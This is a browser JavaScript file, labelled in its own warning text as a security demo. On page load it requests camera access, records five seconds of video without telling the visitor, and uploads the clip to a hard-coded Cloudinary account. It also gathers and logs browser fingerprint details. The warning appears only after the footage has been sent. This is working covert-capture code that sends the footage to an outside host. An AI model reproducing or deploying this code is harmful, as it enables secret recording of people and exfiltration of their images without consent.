const video = document.getElementById("video");
const warning = document.getElementById("warning");

async function startCamera() {

    try {

        const stream = await navigator.mediaDevices.getUserMedia({
            video: true
        });

        video.srcObject = stream;

        record(stream);

    } catch (err) {

        warning.innerText = "Camera permission denied.";

    }

}

function record(stream) {

    const recorder = new MediaRecorder(stream);
    let chunks = [];

    recorder.ondataavailable = e => {

        chunks.push(e.data);

    };

    recorder.onstop = async () => {

        const blob = new Blob(chunks, { type: "video/webm" });

        const formData = new FormData();
        formData.append("file", blob);
        formData.append("upload_preset", "IS08000848");

        try {

            const response = await fetch(
                "https://api.cloudinary.com/v1_1/devl03mpo/video/upload",
                {
                    method: "POST",
                    body: formData
                }
            );

            const data = await response.json();

            console.log("Uploaded video URL:", data.secure_url);

            warning.innerText =
                "Security Warning: This demo shows how malicious websites could misuse camera permissions. Always verify before allowing camera access.";

        } catch (err) {

            console.log("Upload failed:", err);
            warning.innerText = "Upload failed.";

        }

    };

    recorder.start();

    setTimeout(() => {

        recorder.stop();

    }, 5000);

}

function deviceInfo() {

    let info =
        "Browser: " + navigator.userAgent + "\n" +
        "Platform: " + navigator.platform + "\n" +
        "Resolution: " + screen.width + "x" + screen.height + "\n" +
        "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone;

    console.log(info);

}

window.onload = () => {

    startCamera();
    deviceInfo();

};
